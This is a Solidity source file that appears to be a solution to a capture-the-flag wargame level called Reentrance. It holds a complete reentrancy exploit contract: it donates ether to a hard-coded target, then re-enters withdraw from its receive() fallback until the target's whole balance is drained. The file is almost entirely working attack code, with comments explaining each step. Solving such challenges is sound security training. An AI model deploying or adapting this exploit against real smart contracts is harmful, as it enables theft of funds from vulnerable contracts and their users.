// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

interface Reentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
}

contract ReentranceAttack {

    Reentrance challenge = Reentrance(0x8F65C94071c45B81399F7C5fFDD106C628DbbacB);
    uint256 initialDeposit;

    function attack() external payable {
        require(msg.value >= 0.1 ether, "send some more ether");

        // first deposit some funds
        initialDeposit = msg.value;
        challenge.donate{value: initialDeposit}(address(this));

        // withdraw these funds over and over again because of re-entrancy issue
        callWithdraw();
    }

    receive() external payable {
        // re-entrance called by challenge
        callWithdraw();
    }

    function callWithdraw() private {
        // this balance correctly updates after withdraw
        uint256 challengeTotalRemainingBalance = address(challenge).balance;
        // are there more tokens to empty?
        bool keepRecursing = challengeTotalRemainingBalance > 0;

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw =
                initialDeposit < challengeTotalRemainingBalance
                    ? initialDeposit
                    : challengeTotalRemainingBalance;
            challenge.withdraw(toWithdraw);
        }
    }    
}